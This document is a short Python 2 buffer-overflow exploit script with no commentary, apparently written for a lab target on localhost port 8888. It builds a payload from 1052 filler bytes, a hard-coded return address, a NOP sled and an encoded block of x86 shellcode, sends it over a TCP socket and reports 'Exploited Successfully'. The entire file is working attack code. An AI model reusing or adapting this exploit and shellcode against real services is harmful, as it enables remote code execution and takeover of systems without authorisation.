#!/usr/bin/python2

import socket
import sys

host = "127.0.0.1"
port = 8888

crash = "A" * 1052
return_address = "\x7b\x8a\xa9\x68"
nops_sled = "\x90" * 20
shellcode = (
"\xd9\xc8\xd9\x74\x24\xf4\x5e\xba\xad\xe1\x8b\xb2\x2b\xc9"
"\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6\xa9\x03\x7e\x4e"
"\x59\x41\x81\xaf\x99\x26\x0b\x4a\xa8\x66\x6f\x1e\x9a\x56"
"\xfb\x72\x16\x1c\xa9\x66\xad\x50\x66\x88\x06\xde\x50\xa7"
"\x97\x73\xa0\xa6\x1b\x8e\xf5\x08\x22\x41\x08\x48\x63\xbc"
"\xe1\x18\x3c\xca\x54\x8d\x49\x86\x64\x26\x01\x06\xed\xdb"
"\xd1\x29\xdc\x4d\x6a\x70\xfe\x6c\xbf\x08\xb7\x76\xdc\x35"
"\x01\x0c\x16\xc1\x90\xc4\x67\x2a\x3e\x29\x48\xd9\x3e\x6d"
"\x6e\x02\x35\x87\x8d\xbf\x4e\x5c\xec\x1b\xda\x47\x56\xef"
"\x7c\xac\x67\x3c\x1a\x27\x6b\x89\x68\x6f\x6f\x0c\xbc\x1b"
"\x8b\x85\x43\xcc\x1a\xdd\x67\xc8\x47\x85\x06\x49\x2d\x68"
"\x36\x89\x8e\xd5\x92\xc1\x22\x01\xaf\x8b\x28\xd4\x3d\xb6"
"\x1e\xd6\x3d\xb9\x0e\xbf\x0c\x32\xc1\xb8\x90\x91\xa6\x27"
"\x73\x30\xd2\xcf\x2a\xd1\x5f\x92\xcc\x0f\xa3\xab\x4e\xba"
"\x5b\x48\x4e\xcf\x5e\x14\xc8\x23\x12\x05\xbd\x43\x81\x26"
"\x94\x27\x44\xb5\x74\x86\xe3\x3d\x1e\xd6"
)
padding = "B" * 2000
payload = crash + return_address + nops_sled + shellcode + padding

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(bytes(payload))
	s.close()
	print("[+] Exploited Successfully")
except:
	print("Exploit didn't worked successfully")
	sys.exit
